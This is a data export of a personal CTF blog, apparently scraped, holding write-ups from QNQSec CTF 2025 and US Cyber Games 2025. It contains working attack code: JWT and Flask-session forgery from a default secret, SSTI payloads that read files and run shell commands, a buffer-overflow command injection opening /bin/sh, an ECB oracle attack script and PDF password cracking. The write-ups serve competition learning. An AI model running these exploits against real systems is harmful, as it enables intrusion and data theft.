
[{"content":"","date":"October 21, 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":" About Me # Hello! I\u0026rsquo;m Stephen Waweru, a cybersecurity enthusiast and CTF competitor passionate about reverse engineering, web security, and digital forensics.\nWhat I Do # I participate in Capture The Flag (CTF) competitions and document my solutions through detailed writeups. My areas of focus include:\nReverse Engineering - Analyzing binaries and understanding program behavior Web Security - Finding and exploiting web vulnerabilities Digital Forensics - Investigating security incidents and data recovery Cryptography - Understanding encryption and cryptographic attacks CTF Experience # Contact # Feel free to reach out if you have questions about my writeups or want to collaborate on security research!\nEmail: stephenx0r@proton.me LinkedIn: stephengathumbi GitHub: Stephenx0r ","date":"October 21, 2025","externalUrl":null,"permalink":"/about/","section":"","summary":"\u003ch1 class=\"relative group\"\u003eAbout Me\n    \u003cdiv id=\"about-me\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#about-me\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h1\u003e\n\u003cp\u003eHello! I\u0026rsquo;m Stephen Waweru, a cybersecurity enthusiast and CTF competitor passionate about reverse engineering, web security, and digital forensics.\u003c/p\u003e","title":"About","type":"page"},{"content":"","date":"October 21, 2025","externalUrl":null,"permalink":"/tags/jwt/","section":"Tags","summary":"","title":"Jwt","type":"tags"},{"content":"","date":"October 21, 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":" The Challenge # The challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: \u0026ldquo;The reflection is mine, but the soul feels borrowed\u0026rdquo; - which, as we\u0026rsquo;ll see, was a hint about the JWT manipulation we\u0026rsquo;d need to do.\nimport os import sqlite3 import secrets import hashlib from hashlib import md5 from datetime import datetime, timedelta, timezone import jwt from flask import ( Flask, request, render_template, redirect, session, flash, url_for, g, abort, make_response ) from admin_routes import admin_bp,generate_jwt BASE_DIR = os.path.abspath(os.path.dirname(__file__)) SECRET_DIR = os.path.join(BASE_DIR, \u0026#39;secret\u0026#39;) FLAG_PATH = os.path.join(SECRET_DIR, \u0026#39;flag.txt\u0026#39;) FLAG_PREFIX = \u0026#39;QnQsec\u0026#39; def ensure_flag(): os.makedirs(SECRET_DIR, exist_ok=True) if not os.path.exists(FLAG_PATH): with open(FLAG_PATH, \u0026#39;w\u0026#39;) as f: f.write(f\u0026#34;{FLAG_PREFIX}{{{secrets.token_hex(16)}}}\u0026#34;) ensure_flag() app = Flask(__name__) base = os.environ.get(\u0026#34;Q_SECRET\u0026#34;, \u0026#34;qnqsec-default\u0026#34;) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.sha1((\u0026#34;pepper:\u0026#34; + base).encode()).hexdigest() app.config[\u0026#39;JWT_SECRET\u0026#39;] = hashlib.sha256((\u0026#34;jwtpepper:\u0026#34; + base).encode()).hexdigest() app.config[\u0026#39;JWT_EXPIRES_MIN\u0026#39;] = 60 app.register_blueprint(admin_bp) DB_PATH = os.path.join(BASE_DIR, \u0026#39;users.db\u0026#39;) def get_db(): if \u0026#39;db\u0026#39; not in g: g.db = sqlite3.connect(DB_PATH, timeout=10) g.db.row_factory = sqlite3.Row return g.db @app.teardown_appcontext def close_db(_exc): db = g.pop(\u0026#39;db\u0026#39;, None) if db is not None: db.close() def init_db(): with sqlite3.connect(DB_PATH, timeout=10) as db: db.execute(\u0026#39;PRAGMA journal_mode=WAL\u0026#39;) db.execute(\u0026#39;drop table if exists users\u0026#39;) db.execute(\u0026#39;create table users(username text primary key, password text not null)\u0026#39;) db.execute(\u0026#39;insert into users values(\u0026#34;flag\u0026#34;, \u0026#34;401b0e20e4ccf7a8df254eac81e269a0\u0026#34;)\u0026#39;) db.commit() if not os.path.exists(DB_PATH): init_db() @app.route(\u0026#39;/\u0026#39;) def index(): return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/sign_up\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def sign_up(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;sign_up.html\u0026#39;) username = (request.form.get(\u0026#39;username\u0026#39;) or \u0026#39;\u0026#39;).strip() password = request.form.get(\u0026#39;password\u0026#39;) or \u0026#39;\u0026#39; if not username or not password: flash(\u0026#39;Missing username or password\u0026#39;, \u0026#39;error\u0026#39;) return render_template(\u0026#39;sign_up.html\u0026#39;) try: db = get_db() db.execute( \u0026#39;insert into users values(lower(?), ?)\u0026#39;, (username, md5(password.encode()).hexdigest()) ) db.commit() flash(f\u0026#39;User {username} created\u0026#39;, \u0026#39;message\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) except sqlite3.IntegrityError: flash(\u0026#39;Username is already registered\u0026#39;, \u0026#39;error\u0026#39;) return render_template(\u0026#39;sign_up.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;login.html\u0026#39;) username = (request.form.get(\u0026#39;username\u0026#39;) or \u0026#39;\u0026#39;).strip() password = request.form.get(\u0026#39;password\u0026#39;) or \u0026#39;\u0026#39; if not username or not password: flash(\u0026#39;Missing username or password\u0026#39;, \u0026#39;error\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;) db = get_db() row = db.execute( \u0026#39;select username, password from users where username = lower(?) and password = ?\u0026#39;, (username, md5(password.encode()).hexdigest()) ).fetchone() if row: session[\u0026#39;user\u0026#39;] = username.title() role = \u0026#34;admin\u0026#34; if username.lower() == \u0026#34;flag\u0026#34; else \u0026#34;user\u0026#34; token = generate_jwt(session[\u0026#39;user\u0026#39;],role,app.config[\u0026#39;JWT_EXPIRES_MIN\u0026#39;],app.config[\u0026#39;JWT_SECRET\u0026#39;]) resp = make_response(redirect(url_for(\u0026#39;account\u0026#39;))) resp.set_cookie(\u0026#34;admin_jwt\u0026#34;, token, httponly=False, samesite=\u0026#34;Lax\u0026#34;) return resp flash(\u0026#39;Invalid username or password\u0026#39;, \u0026#39;error\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;user\u0026#39;, None) resp = make_response(redirect(url_for(\u0026#39;login\u0026#39;))) resp.delete_cookie(\u0026#34;admin_jwt\u0026#34;) return resp @app.route(\u0026#39;/account\u0026#39;) def account(): user = session.get(\u0026#39;user\u0026#39;) if not user: return redirect(url_for(\u0026#39;login\u0026#39;)) if user == \u0026#39;Flag\u0026#39;: return render_template(\u0026#39;account.html\u0026#39;, user=user, is_admin=True) return render_template(\u0026#39;account.html\u0026#39;, user=user, is_admin=False) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000, debug=False, use_reloader=False) Target: http://161.97.155.116:5001\nInitial Reconnaissance # First, let me show you what we\u0026rsquo;re working with. The application had these endpoints:\n/ - Redirects to login /login - User authentication /sign_up - User registration /account - User dashboard /admin - Admin template renderer (protected) I started by exploring the application and noticed it used both JWT tokens and Flask sessions for authentication. Interesting\u0026hellip;\nQuick Analysis of the Source Code # Here\u0026rsquo;s where things get interesting. Let me show you the critical vulnerability in the source code:\nbase = os.environ.get(\u0026#34;Q_SECRET\u0026#34;, \u0026#34;qnqsec-default\u0026#34;) # Default value! app.config[\u0026#39;JWT_SECRET\u0026#39;] = hashlib.sha256((\u0026#34;jwtpepper:\u0026#34; + base).encode()).hexdigest() app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.sha1((\u0026#34;pepper:\u0026#34; + base).encode()).hexdigest() Predictable Default Value: If Q_SECRET isn\u0026rsquo;t set, it defaults to \u0026quot;qnqsec-default\u0026quot;. This means every instance with default configuration uses the same base value.\nWhy this is exploitable:\nWe can calculate the exact same secrets the server uses We can forge valid JWT tokens with any payload we want We can forge valid Flask sessions for any user The server accepts our forged tokens because they\u0026rsquo;re cryptographically valid The attack:\nCalculate JWT secret: sha256(\u0026quot;jwtpepper:qnqsec-default\u0026quot;) Calculate Flask secret: sha1(\u0026quot;pepper:qnqsec-default\u0026quot;) Forge admin JWT token using the calculated secret Forge Flask session as \u0026ldquo;Flag\u0026rdquo; user using the calculated secret Use both forged tokens to bypass authentication and access admin features Bottom line: The server can\u0026rsquo;t tell the difference between our forged tokens and legitimate ones because they\u0026rsquo;re cryptographically identical. We essentially became the \u0026ldquo;server\u0026rdquo; by knowing its secrets!\nForging the JWT Token # Let\u0026rsquo;s start by forging the JWT token. Since we know the secret derivation pattern, we can calculate the exact same secret the server uses:\nimport jwt import hashlib from datetime import datetime, timedelta, timezone base = \u0026#34;qnqsec-default\u0026#34; jwt_secret = hashlib.sha256(f\u0026#34;jwtpepper:{base}\u0026#34;.encode()).hexdigest() print(f\u0026#34;JWT Secret: {jwt_secret}\u0026#34;) # Output: 426c6e42adf5519072772b799cf987967ee9a7effaa144ff133b43c141377580 # Create admin payload payload = { \u0026#39;sub\u0026#39;: \u0026#39;Flag\u0026#39;, \u0026#39;role\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;iat\u0026#39;: int(datetime.now(timezone.utc).timestamp()), \u0026#39;exp\u0026#39;: int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()) } # Generate JWT token admin_token = jwt.encode(payload, jwt_secret, algorithm=\u0026#39;HS256\u0026#39;) print(f\u0026#34;Admin JWT Token: {admin_token}\u0026#34;) This creates a valid JWT token with admin privileges that the server will accept because it\u0026rsquo;s signed with the correct secret.\nForging the Flask Session # Now that we have the JWT token, we also need to forge the Flask session. The application uses both authentication mechanisms - the Flask session tells the app \u0026ldquo;you are logged in as Flag user\u0026rdquo; while the JWT token tells it \u0026ldquo;you have admin role\u0026rdquo;. We need both to access the admin panel.\nTo forge the Flask session, we first calculate the Flask session secret using the same predictable pattern. Looking at the source code:\nbase = os.environ.get(\u0026#34;Q_SECRET\u0026#34;,has) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.sha1((\u0026#34;pepper:\u0026#34; + base).encode()).hexdigest() We use sha1(\u0026quot;pepper:qnqsec-default\u0026quot;) which gives us 40913aa300c33db34d976a59975adf18d90a246a. This is the exact same secret the server uses to sign its session cookies.\nNext, we create a Flask application instance with this secret and use its session serializer to create a valid session cookie:\nimport hashlib from flask.sessions import SecureCookieSessionInterface from flask import Flask # Calculate the Flask session secret (same as server) flask_secret = hashlib.sha1(b\u0026#34;pepper:qnqsec-default\u0026#34;).hexdigest() print(f\u0026#34;Flask Secret: {flask_secret}\u0026#34;) # Output: 40913aa300c33db34d976a59975adf18d90a246a # Create Flask app with the same secret app = Flask(__name__) app.secret_key = flask_secret # Create session serializer session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) # Forge session as \u0026#34;Flag\u0026#34; user session_data = {\u0026#39;user\u0026#39;: \u0026#39;Flag\u0026#39;} forged_session = session_serializer.dumps(session_data) print(f\u0026#34;Forged Session: {forged_session}\u0026#34;) # Output: eyJ1c2VyIjoiRmxhZyJ9.aPdXOw.m9jtrZIKQvIBAT5URMNCY5sfJU0 We set the session data to {'user': 'Flag'} which matches what the server would set when the Flag user logs in. The session serializer signs this data with the secret, creating a cookie that the server will accept as valid.\nThe forged session cookie looks like eyJ1c2VyIjoiRmxhZyJ9.aPdXOw.m9jtrZIKQvIBAT5URMNCY5sfJU0 and contains the user information that the application checks to determine if someone is logged in. Since we used the same secret the server uses, this cookie is cryptographically identical to one the server would create itself.\nNow we have both pieces of the authentication puzzle - a valid Flask session that says we\u0026rsquo;re logged in as the Flag user, and a valid JWT token that says we have admin privileges. Together, these allow us to bypass the complete authentication system and access the admin panel.\nThe Attack # Now comes the fun part. I need both tokens because the application checks:\nFlask session for authentication (are you logged in?) JWT token for authorization (are you an admin?) import requests session = requests.Session() session.cookies.set(\u0026#39;session\u0026#39;, forged_session) # Authentication session.cookies.set(\u0026#39;admin_jwt\u0026#39;, admin_token) # Authorization # Test admin access resp = session.get(\u0026#39;http://161.97.155.116:5001/admin\u0026#39;) print(f\u0026#34;Admin status: {resp.status_code}\u0026#34;) Great! I got 200 OK. The admin panel shows a template renderer form:\nThe SSTI Exploit # This is where the real magic happens. The admin panel renders user input as Jinja2 templates without sanitization - classic Server-Side Template Injection (SSTI)!\nI used this payload to read the flag file:\nssti_payload = \u0026#39;{{ self.__init__.__globals__.__builtins__.open(\u0026#34;secret/flag.txt\u0026#34;).read() }}\u0026#39; resp = session.post(\u0026#39;http://161.97.155.116:5001/admin\u0026#39;, data={\u0026#39;template\u0026#39;: ssti_payload}) if \u0026#39;QnQsec{\u0026#39; in resp.text: print(\u0026#34;🚩 FLAG FOUND!\u0026#34;) print(resp.text) Alternative payload\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cd secret; cat flag.txt').read() }}\nThe Complete Exploit # Here\u0026rsquo;s my complete exploit script:\n#!/usr/bin/env python3 import requests import jwt import hashlib from flask.sessions import SecureCookieSessionInterface from flask import Flask from datetime import datetime, timedelta, timezone def exploit(): # Calculate secrets jwt_secret = hashlib.sha256(\u0026#34;jwtpepper:qnqsec-default\u0026#34;.encode()).hexdigest() flask_secret = hashlib.sha1(b\u0026#34;pepper:qnqsec-default\u0026#34;).hexdigest() # Generate JWT token payload = { \u0026#39;sub\u0026#39;: \u0026#39;Flag\u0026#39;, \u0026#39;role\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;iat\u0026#39;: int(datetime.now(timezone.utc).timestamp()), \u0026#39;exp\u0026#39;: int((datetime.now(timezone.utc) + timedelta(hours=1)).timestamp()) } admin_token = jwt.encode(payload, jwt_secret, algorithm=\u0026#39;HS256\u0026#39;) # Generate Flask session app = Flask(__name__) app.secret_key = flask_secret session_serializer = SecureCookieSessionInterface().get_signing_serializer(app) session_data = {\u0026#39;user\u0026#39;: \u0026#39;Flag\u0026#39;} forged_session = session_serializer.dumps(session_data) # Exploit session = requests.Session() session.cookies.set(\u0026#39;session\u0026#39;, forged_session) session.cookies.set(\u0026#39;admin_jwt\u0026#39;, admin_token) # Access admin panel resp = session.get(\u0026#39;http://161.97.155.116:5001/admin\u0026#39;) print(f\u0026#34;Admin status: {resp.status_code}\u0026#34;) if resp.status_code == 200: # SSTI exploit ssti_payload = \u0026#39;{{ self.__init__.__globals__.__builtins__.open(\u0026#34;secret/flag.txt\u0026#34;).read() }}\u0026#39; resp = session.post(\u0026#39;http://161.97.155.116:5001/admin\u0026#39;, data={\u0026#39;template\u0026#39;: ssti_payload}) if \u0026#39;QnQsec{\u0026#39; in resp.text: print(\u0026#34;🚩 FLAG FOUND!\u0026#34;) print(resp.text) if __name__ == \u0026#34;__main__\u0026#34;: exploit() Request in Burpsuite Key Takeaways # This challenge was a perfect example of how defense in depth can fail when the underlying security mechanisms are flawed:\nPredictable Secrets: The root cause was deriving secrets from predictable patterns Multi-layer Bypass: Both JWT and Flask session authentication were bypassed SSTI Exploitation: Admin access led to template injection and file read Complete Compromise: From authentication bypass to RCE in one chain How to Fix This # # ❌ BAD - Predictable base = os.environ.get(\u0026#34;Q_SECRET\u0026#34;, \u0026#34;qnqsec-default\u0026#34;) app.config[\u0026#39;JWT_SECRET\u0026#39;] = hashlib.sha256((\u0026#34;jwtpepper:\u0026#34; + base).encode()).hexdigest() # ✅ GOOD - Random and secure import secrets app.config[\u0026#39;JWT_SECRET\u0026#39;] = secrets.token_hex(32) app.config[\u0026#39;SECRET_KEY\u0026#39;] = secrets.token_hex(32) Flag: QnQsec{b4efafeb4bd43c404e425ea6d664a0f6}\nThis was a really fun challenge that combined multiple attack vectors. The key lesson here is that secret management is critical - if your secrets are predictable, all your authentication mechanisms become useless.\n","date":"October 21, 2025","externalUrl":null,"permalink":"/posts/2025-10-12-qnqsecctf2025/","section":"Posts","summary":"\u003ch2 class=\"relative group\"\u003eThe Challenge\n    \u003cdiv id=\"the-challenge\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"text-primary-300 dark:text-neutral-700 !no-underline\" href=\"#the-challenge\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e\n    \n\u003c/h2\u003e\n\u003cp\u003eThe challenge presented us with a Flask web application that had JWT authentication and an admin panel. The description was cryptic: \u003cem\u003e\u0026ldquo;The reflection is mine, but the soul feels borrowed\u0026rdquo;\u003c/em\u003e - which, as we\u0026rsquo;ll see, was a hint about the JWT manipulation we\u0026rsquo;d need to do.\u003c/p\u003e","title":"QNQSec CTF 2025","type":"posts"},{"content":"","date":"October 21, 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"October 21, 2025","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"June 20, 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"June 20, 2025","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"Ctf","type":"categories"},{"content":"","date":"June 20, 2025","externalUrl":null,"permalink":"/tags/jail/","section":"Tags","summary":"","title":"Jail","type":"tags"},{"content":"","date":"June 20, 2025","externalUrl":null,"permalink":"/categories/reverse-engineering/","section":"Categories","summary":"","title":"Reverse Engineering","type":"categories"},{"content":"","date":"June 20, 2025","externalUrl":null,"permalink":"/tags/reverseengineering/","section":"Tags","summary":"","title":"Reverseengineering","type":"tags"},{"content":"This write up documents the challenges I solved during the US Cyber Games 2025 , specifically in the categories of Pwn, Forensics, Reverse Engineering, and Cryptography. Each section walks through my process—from analyzing binary exploits and reconstructing OLED display data to decrypting protected files and extracting browser artifacts.\nDrive Discovery # Challenge File: nothinginterestinghere.001\nCategory: Forensics\nTools Used: file, FTK Imager, base64\nDescription\nWe’re given a file named nothinginterestinghere.001 — clearly a disk image segment. Our task is to examine it and extract any hidden or deleted secrets. Digging in with FTK Imager # I opened the .001 file using FTK Imager. Within the folder view, under a directory labeled secrets, I found a deleted file named flag.txt.\nEven though the file was deleted, its contents were still recoverable. The content looked like this:\nU1ZCUkd7ZDNsMzczZF9uMDdfZjByNjA3NzNuXzI4MzAyOTM4Mn0= Decoding the Flag # I copied the string and used the base64 command-line utility to decode it:\nSVBRG{d3l373d_n07_f0r60773n_283029382} Gotta Go Low # Description\nWe’re given RSA parameters:\ne = 3 n = 131568056653373132012174976653266884910157447726840322128654668864744046838266089026781586223439349724120314053694539817871939811571791816723493939318461523177171366268168393668921342560692769288416456729904590430725433093936110904690901655852707387030375716854722258158043345187159940346383427399753323791427 ciphertext = 898564915277349210856325643177982880844269990070750993964886895279898673815668084088711509416748167698104435154155125903563814943672577759197896689419072923530272379905743352154731864706846939063378835946564725599528080721144587149407333 We’re also provided the challenge script used to generate the keypair and encrypt the flag. This lets us infer something critical: no padding was used.\nVulnerability: Low Exponent + Small Message # Since e = 3 and the message was likely small (like a flag), if the plaintext cubed (m³) is smaller than the modulus n, then: ciphertext=m^3\nThis makes RSA trivially breakable by taking the integer cube root of the ciphertext.\nSolution\nfrom sympy import integer_nthroot ciphertext = 898564915277349210856325643177982880844269990070750993964886895279898673815668084088711509416748167698104435154155125903563814943672577759197896689419072923530272379905743352154731864706846939063378835946564725599528080721144587149407333 n = 131568056653373132012174976653266884910157447726840322128654668864744046838266089026781586223439349724120314053694539817871939811571791816723493939318461523177171366268168393668921342560692769288416456729904590430725433093936110904690901655852707387030375716854722258158043345187159940346383427399753323791427 e = 3 m_root, exact = integer_nthroot(ciphertext, e) if exact: plaintext_int = m_root plaintext = plaintext_int.to_bytes((plaintext_int.bit_length() + 7) // 8, byteorder=\u0026#39;big\u0026#39;).decode() print(\u0026#34;message:\u0026#34;, plaintext) else: print(\u0026#34;The cube root is not exact\u0026#34;) SVBGR{l0w_3xp0n3nt5_@r3_n0t_s@fe} BezoutBezoutBezout # Description\nWe were given:\nA list of numbers in nums.txt A list of GCD values in gcds.txt A validation script bezoutbezoutbezout.py containing this core logic: for i in range(len(gcds)): d = gcds[i] a, b = magic_select(d, nums) s, t = magic_bezout(a, b) assert(d + s + t == ord(flag[i])) This strongly suggests the use of the Extended Euclidean Algorithm.\nSolution\nAfter reading about Bézout\u0026rsquo;s identity, the path became clear: if gcd(a, b) = d, then there exist integers s and t such that:\nIf gcd(a,b)=d, then s⋅a+t⋅b=d\nWhich leads to: flag[i]=d+s+t\nAll we needed was to find such (a, b) pairs in nums.txt with the correct gcd and recover s + t.\nfrom math import gcd from itertools import combinations with open(\u0026#34;gcds.txt\u0026#34;) as f: gcds = eval(f.read()) with open(\u0026#34;nums.txt\u0026#34;) as f: nums = eval(f.read()) def extended_gcd(a, b): if b == 0: return (1, 0, a) else: x1, y1, g = extended_gcd(b, a % b) x, y = y1, x1 - (a // b) * y1 return (x, y, g) valid_chars_per_index = [] for d in gcds: candidates = set() for a, b in combinations(nums, 2): if gcd(a, b) == d: x, y, g = extended_gcd(a, b) x *= d // g y *= d // g for k in range(-3, 4): s = x - k * (b // d) t = y + k * (a // d) val = d + s + t if 32 \u0026lt;= val \u0026lt;= 126: candidates.add(chr(val)) if not candidates: candidates.add(\u0026#39;?\u0026#39;) valid_chars_per_index.append(sorted(candidates)) def backtrack(index, current): if index == len(valid_chars_per_index): return current for ch in valid_chars_per_index[index]: result = backtrack(index + 1, current + ch) if result: return result return None flag = backtrack(0, \u0026#34;\u0026#34;) print(\u0026#34;flag:\u0026#34;, flag) SVBGR{numb3rs_h0ld_s3cr3ts_1f_u_l00k_cl0s3} Block Blast # Description\nThis challenge exposes an AES-ECB encryption oracle that appends a secret flag to user-controlled input. By exploiting ECB\u0026rsquo;s deterministic block structure, we recover the flag one byte at a time using a crafted prefix and ciphertext matching.\nOracle Behavior (learned from code) # def encrypt_oracle(user_bytes: bytes) -\u0026gt; bytes: plaintext = user_bytes + FLAG The challenge encrypts user-controlled input followed by an unknown flag using AES-ECB, so by carefully aligning our input, we can recover the flag one byte at a time through ciphertext block comparison.\nblock = known_input + unknown_flag_byte And since ECB encrypts each block independently, repeating known input gives us a way to guess the next byte of the flag.\nSolution\n#!/usr/bin/env python3 import socket, binascii, string def connect(host=\u0026#34;crypto.ctf.uscybergames.com\u0026#34;, port=5001): s = socket.socket(); s.connect((host, port)) print(s.recv(1024).decode()) return s def query(sock, hex_data): sock.send((hex_data + \u0026#34;\\n\u0026#34;).encode()) r = sock.recv(4096).decode().strip() return r[2:] if r.startswith(\u0026#34;\u0026gt; \u0026#34;) else r def ecb_byte_at_a_time(sock): BLOCK_SIZE = 16 flag = b\u0026#34;\u0026#34; charset = string.printable.encode() print(\u0026#34;[+]attack...\u0026#34;) for i in range(100): pad_len = (BLOCK_SIZE - 1 - (len(flag) % BLOCK_SIZE)) % BLOCK_SIZE pad = b\u0026#34;A\u0026#34; * pad_len target = query(sock, binascii.hexlify(pad).decode()) blk_idx = (pad_len + len(flag)) // BLOCK_SIZE blk_range = slice(blk_idx * 32, (blk_idx + 1) * 32) ref_block = target[blk_range] for b in charset: guess = pad + flag + bytes([b]) guess += b\u0026#34;A\u0026#34; * ((BLOCK_SIZE - len(guess) % BLOCK_SIZE) % BLOCK_SIZE) guess_hex = binascii.hexlify(guess[: (blk_idx + 1) * BLOCK_SIZE]).decode() resp = query(sock, guess_hex) if resp[blk_range] == ref_block: flag += bytes([b]) print(f\u0026#34;[+] found byte: {chr(b)} | flag: {flag.decode(errors=\u0026#39;replace\u0026#39;)}\u0026#34;) break else: print(\u0026#34;[!] Byte not found.\u0026#34;); break if flag.endswith(b\u0026#39;}\u0026#39;) and flag.startswith(b\u0026#39;flag{\u0026#39;): print(f\u0026#34;[+] Full flag: {flag.decode()}\u0026#34;); break return flag def main(): print(\u0026#34;[+] Connecting...\u0026#34;) sock = connect() try: flag = ecb_byte_at_a_time(sock) print(f\u0026#34;[+] Flag: {flag.decode(errors=\u0026#39;replace\u0026#39;)}\u0026#34;) finally: sock.close() if __name__ == \u0026#34;__main__\u0026#34;: main() SVBGR{M3G4_P0W3RUP_C0MB0} Donut # Binary Protections # Description\nYou can set your timezone, buy donuts (costs money), earn money (via a guessing game), and access a hidden maintenance mode if the donuts variable is set to the magic value 0xCAFEBABE\nBinary Protections # Reverse Engineering # From the main() and maintenance() functions, we learn the following\ngets(timezone); // vulnerable input We can overflow timezone to overwrite donuts, which is how access to the admin panel is gated:\nif (donuts == -889275714) { // 0xCAFEBABE // admin panel } Inside admin panel:\nsnprintf(cmd, 0x64, \u0026#34;date --date=\u0026#39;TZ=\\\u0026#34;%s\\\u0026#34;\u0026#39;\u0026#34;, timezone); system(cmd); // command injection possible Exploit Strategy\nCraft payload for gets(timezone):\nFill 32 bytes of timezone\nSkip 4 bytes of money\nOverwrite donuts with 0xCAFEBABE\nInject a shell command in timezone so it ends up in:\ndate --date=\u0026#39;TZ=\u0026#34;\u0026#39;;/bin/sh;\u0026#39;\u0026#34;\u0026#39; When system() runs that, we execute /bin/sh. Send option 3 (maintenance mode) to trigger the exploit. from pwn import * REMOTE_HOST = \u0026#34;pwn.ctf.uscybergames.com\u0026#34; REMOTE_PORT = 5000 p = remote(REMOTE_HOST, REMOTE_PORT) command_payload = b\u0026#34;\u0026#39;;/bin/sh;\u0026#39;\u0026#34; padding_timezone = b\u0026#34;A\u0026#34; * (32 - len(command_payload)) padding_money = b\u0026#34;B\u0026#34; * 4 donuts_value = p32(0xCAFEBABE) exploit_payload = command_payload + padding_timezone + padding_money + donuts_value log.info(f\u0026#34;Sending exploit payload...\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, exploit_payload) # Send option 3 to enter maintenance panel log.info(\u0026#34;Triggering admin panel...\u0026#34;) p.sendlineafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;3\u0026#34;) log.success(\u0026#34;Enjoy your shell 🍩\u0026#34;) p.interactive() CTF Cafe # We’re given a 64-bit ELF binary named ctf_cafe, dynamically linked and not stripped—which is great because all symbols are intact for reverse engineering.\nSolution Analyzing main(), we find:\nif (v4 == 9) { puts(\u0026#34;Oh, so you want the secret sauce recipe? Only if you have our proprietary key!\u0026#34;); printf(\u0026#34;Enter 8-byte hex key: \u0026#34;); if (scanf(\u0026#34;%lx\u0026#34;, \u0026amp;key) == 1) { if (key == 0x9BD2C75A49C4EFEB) { puts(\u0026#34;Congratulations!\u0026#34;); for (i = 0; i \u0026lt;= 0x20; ++i) putchar(secret_sauce[i] ^ size[i % 8]); } The key we need is 0x9BD2C75A49C4EFEB, and it decrypts the bytes in the array secret_sauce using XOR with a repeating size array.\nsecret_sauce = [ 0xC8, 0x84, 0x85, 0x1D, 0x1B, 0xBF, 0x8B, 0xD8, 0xF8, 0xE2, 0xAA, 0x2A, 0x78, 0xA8, 0xDC, 0x99, 0xE8, 0x8D, 0xAA, 0x6E, 0x22, 0xF7, 0xB0, 0x87, 0xAA, 0xB4, 0xF4, 0x05, 0x7A, 0xF0, 0x9C, 0x92, 0xE6 ] size = [0x9B, 0xD2, 0xC7, 0x5A, 0x49, 0xC4, 0xEF, 0xEB] recipe = \u0026#39;\u0026#39;.join(chr(secret_sauce[i] ^ size[i % 8]) for i in range(len(secret_sauce))) print(\u0026#34;secret sauce recipe:\u0026#34;, recipe) SVBGR{d3c0mp1l3rs_m4k3_l1f3_34sy} Historical Fiction # Description\nOne of the US Cyber Games administrators is looking for a cybersecurity book. They don’t want the hardcover or Kindle version—just the paperback. The ISBN of the paperback book is the flag.\nWe’re provided with a zipped copy of a user\u0026rsquo;s Chrome profile directory. Chrome typically stores browsing history in a file called History under:\n\u0026lt;Chrome User Profile\u0026gt;/Default/History On a typical Linux system, that would be something like:\n~/.config/google-chrome/Default/History The History file is a SQLite 3 database. We can open it like this:\nsqlite3 \u0026#34;Google/Chrome/User Data/Default/History\u0026#34; Among the entries, we find this important one:\nhttps://www.amazon.com/Hack-Back-Techniques-Hackers-Their/dp/1032818530/ref=tmm_pap_swatch_0 This URL points to the paperback edition of:\nThe Hack Is Back by Varsalone, Jesse, and Haller, Christopher\nWe extract the ISBN from the page or URL:\n978-1032818535\nSVUSCG{978-1032818535} Logged # Description\nOne of the US Cyber Games administrators forgot their password to the FTP Server a lot of times. How many times did they forget it according to the IIS Windows log file?\nWe start by extracting ICMP traffic and observing the relative arrival times of packets:\ntshark -r SilentSignal.pcap -Y \u0026#34;icmp\u0026#34; -T fields -e frame.number -e frame.time_relative This gives us output like:\n1 0.000000000 2 83.000000000 3 169.000000000 4 235.000000000 ... The packet timing deltas (differences between each consecutive timestamp) represent ASCII values.\ntimes = [0, 83, 169, 235, 317, 388, 511, 627, 732, 841, 892, 987, 1103, 1217, 1269, 1387, 1438, 1546, 1641, 1759, 1808, 1905, 2000, 2112, 2161, 2271, 2374, 2499] for i in range(1, len(times)): delta = int(times[i] - times[i - 1]) print(chr(delta), end=\u0026#39;\u0026#39;) SVBRG{tim3_tr4v3l_v1a_p1ng} Redactables # Description We’re given a PDF file that appears encrypted and supposedly “redacted.”\nStep 1: Crack the PDF Password # We use pdf2john (from the John the Ripper suite) to extract a crackable hash:\npdf2john redactable.pdf \u0026gt; pdf_hash.txt Then, we crack it using the popular rockyou.txt wordlist:\njohn pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Within seconds, we 